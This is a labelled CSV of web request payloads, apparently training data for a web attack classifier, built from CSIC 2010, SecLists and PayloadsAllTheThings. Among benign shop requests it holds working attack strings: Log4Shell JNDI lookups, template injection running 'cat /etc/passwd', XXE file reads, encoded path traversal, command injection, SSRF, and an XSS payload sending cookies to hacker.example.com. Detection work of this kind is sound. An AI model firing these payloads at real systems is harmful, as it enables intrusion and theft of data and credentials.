payload,label,source
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B2E09F7D9C4A8FFAB3A6EB65D2023799 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1520561C8130B2521402C9AC15E7653E Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
{{% set c=36*36 %}}{{c}},ssti,augmented
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1783579A723581E447C05B25390D0701 Connection: close",normal,csic_2010
${${upper:j}ndi:dns://interact.sh:443/shell},log4shell,augmented
"<?xml version=""1.0""?><!DOCTYPE lolz [<!file528 lol ""lol""><!file528 file528 ""&lol;&lol;&lol;&lol;"">]><lolz>&file528;</lolz>",xxe,augmented
/etc/opt/microsoft/omsagent/sysconf/omsagent.d/syslog.conf,path_traversal,seclists
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5BE90E840CA7A0E0925F0B13262AB77E Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
modo=registro&login=yank&password=tr4n52r&nombre=Ferreol&apellidos=Vilamitj%E0+Ponce&email=devlin_lazar%40joyaseleccion.tk&dni=93119033Z&direccion=Calle+Marques+De+Pontejos+170+&ciudad=Molar%2C+El&cp=44721bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&provincia=Badajoz&ntc=5418660256451813&B1=Registrar,xss,csic_2010
%2522%0A%20str%3D%24%28echo%20TNOFGN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,command_injection,seclists
<#assign s='freemarker.template.utility.Execute'?new()>${s('cat /etc/passwd')},ssti,augmented
..../0x2f..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fboot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B4624E14FB7E6BD46F20C9AF401E526A Connection: close",normal,csic_2010
../../../proc/self/fd/4%00,path_traversal,seclists
%3B%20str%3D%24%28echo%20TSUCKA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,command_injection,seclists
./../{FILE},path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stefanac&password=autointoxicaci%F3n&nombre=Eudoro&apellidos=Valderr%E1bano&email=pessin%40zington%40os.bo&dni=08475533X&direccion=Pl.+Elio+Antonio+De+Nebrija%2C+34+&ciudad=Santa+Mar%EDa+del+Cubillo&cp=43740&provincia=Guadalajara&ntc=3535089372971785&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=268464C68BA58560B4F8A49EF3500378 Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CC44FC71D521B2875B8E47CE97381214 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
0x2e0x2e%uEFC80x2e0x2e%uEFC80x2e0x2e%uEFC8boot.ini,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EBFD9415CD1E44BBAE3A3D88B95DACA3 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
/../..//../..//../{FILE},path_traversal,payloads_all_the_things
../../../../../../../../../../usr/local/php4/lib/php.ini%00,path_traversal,seclists
%7C%20%5B%208%20-ne%20%24%28echo%20QJDBJN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,command_injection,seclists
Column not found: 1054 Unknown column ''x' in 'SELECT',sqli,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6BF98C27F2B2D3B20E8185F187580248 Connection: close",normal,csic_2010
/etc/magic,path_traversal,seclists
"GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=927236C50D0EF040E5561CE3FE54B92E Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D1340C878973FFCE36609B0F6A5EE7E6 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
%f0%80%80%ae%f0%80%80%ae%c1%pc%f0%80%80%ae%f0%80%80%ae%c1%pc%f0%80%80%ae%f0%80%80%ae%c1%pc%f0%80%80%ae%f0%80%80%ae%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BA8B589E490AC172CD77A57ACCDC4337 Connection: close",normal,csic_2010
%c0%ee%c0%ee%5c%c0%ee%c0%ee%5c%c0%ee%c0%ee%5c%c0%ee%c0%ee%5c%c0%ee%c0%ee%5c%c0%ee%c0%ee%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2C4831F4B577D7D08CC2AA5FD1DF7DAE Connection: close",normal,csic_2010
%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qfetc%c0%qfissue,path_traversal,payloads_all_the_things
target=dict://[::1]:9999/admin/config,ssrf,augmented
%252e%252e\%252e%252e\etc\passwd,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F1B7B9A2A7920AFD64DCBC274DD82C36 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
modo=registro&login=petras&password=6av63l&nombre=Babeli&apellidos=Giglio+Beitia&email=speiser%40ubuybetter.aero&dni=83999589R&direccion=Navas+De+Tolosa%2C+107%2C+2%3FE&ciudad=Villalbilla+de+Burgos&cp=15830&provincia=Teruel&ntc=4688437106313833&B1=Registrar,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hoog&password=cAp%21Tar&nombre=Cimoteo&apellidos=Yax&email=embree_chevret%40softwaremasservicio.bs&dni=58007817T&direccion=Isidoro+Rodriguez+Acevedo+192%2C+4H&ciudad=Beniel&cp=45908&provincia=C%F3rdoba&ntc=5109006060601152&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7DC0D19BAABD4620646192BEE2E34F8C Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%4040 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=488E1F1DC0649BFFEBD38947825ED3A6 Connection: close",sqli,csic_2010
modo=registro&login=ziehn&password=caMorrer5&nombre=Jesumina&apellidos=Breither+Herreros&email=mcwaters%409horas.no&dni=55603896Q&direccion=Bejar+52+&ciudad=San+Mam%E9s+de+Campos&cp=33776&provincia=Zamora&ntc=1776622257699158&B1=Registrar,normal,csic_2010
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=821B06B41CFF98EBE535D69FAF8D87CE Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
load=http://0.0.0.0/etc/passwd,ssrf,augmented
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=111B07A528F613FCB85F8967BC5E5EC6 Connection: close",normal,csic_2010
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,xss,seclists
??%e0%80%af??%e0%80%afetc%e0%80%afpasswd,path_traversal,payloads_all_the_things
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",sqli,payloads_all_the_things
GET /?fetch=http://::ffff:127.0.0.1:1099/ HTTP/1.1,ssrf,augmented
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brewer&password=quebrador&nombre=Caledonio&apellidos=Querol+Jopia&email=espinoza%40canariasatuaire.lb&dni=75131649X&direccion=Minguez%2C+98+&ciudad=Marracos&cp=40359&provincia=Teruel&ntc=1275136116918867&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=49D8325D7714C2AFD91AA12A2BD104C0 Connection: close",normal,csic_2010
C:/php5/php.ini,path_traversal,seclists
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1E20DE922DCFB5C95821AB1E14C9CC66 Connection: close",normal,csic_2010
%252e%252e%u2216%252e%252e%u2216%252e%252e%u2216etc%u2216passwd,path_traversal,payloads_all_the_things
modo=insertar&precio=7529&B1=Confirmar,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&pwd=culero&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1E74991639899A3385C414B453F6118D Connection: close",xss,csic_2010
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9C95879CB0C240535CB49732E38C7591 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!evil430 evil430 SYSTEM ""/proc/self/environ"">]><foo>&evil430;</foo>",xxe,augmented
<svg><bgsound onload=alert(1)></bgsound>,xss,seclists
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F8B2CD44CDA5C6BCD4146FE797CF4486 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
exec=bar;whoami;,command_injection,augmented
"GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C7D605E528B0851075D041276FA2C581 Connection: close",normal,csic_2010
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>,xss,seclists
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=548D28BC71BF2AD3DA22812390BCFE50 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FAA037D10291083AFCA5ED149571B116 Connection: close",normal,csic_2010
host=sftp://0177.0.0.01/internal,ssrf,augmented
#{s*42},ssti,augmented
Exploit Description: Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word ”javascript:” - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the ”javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal).,xss,seclists
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=48707D90CFDF220914AC0E52217D180A Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
..\..\..\..\..\..\windows\system32\drivers\etc\hosts%00,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0E53BA7DC793B366C7B6B37AFF794E25 Connection: close",normal,csic_2010
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",xss,seclists
/etc/roundup/cgiconf.py,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DB5EB24F3390C1127874C0DD057FBB25 Connection: close",normal,csic_2010
modo=insertar&precio=8460&B1=Confirmar,normal,csic_2010
modo=registro&login=glaser&password=elementada&nombre=Davel&apellidos=De+Mendonca+Ors&email=chua%40comerciosdeaspe.om&dni=41909752A&direccion=De+La+Coma%2C+112+4-B&ciudad=San+Miguel+de+Abona&cp=04100&provincia=Ourense&ntc=4150902070293588&B1=Registrar,normal,csic_2010
#foreach($b in [1..41])${b}#end,ssti,augmented
.../.%f0%80%80%afetc%f0%80%80%afpasswd,path_traversal,payloads_all_the_things
..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CB12E84FCC6E94B7949693C7D48BAFCC Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9B4AE7FABF77419E9F609615304256A0 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=belrango&password=guapote&nombre=Alexia&apellidosA=Serracana+Abt&email=vertes%40gesmahernan.mq&dni=47583117G&direccion=Calle+Jamaica+189+4%3FH&ciudad=Belmonte+de+Miranda&cp=46417&provincia=Ja%E9n&ntc=9385688686005345&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8B5F8F1ECC5686037829BB7BD38E80AB Connection: close",sqli,csic_2010
modo=insertar&precio=9810&B1=Pasar+por+caja,normal,csic_2010
%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%9c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%9c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%9c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%9cboot.ini,path_traversal,payloads_all_the_things
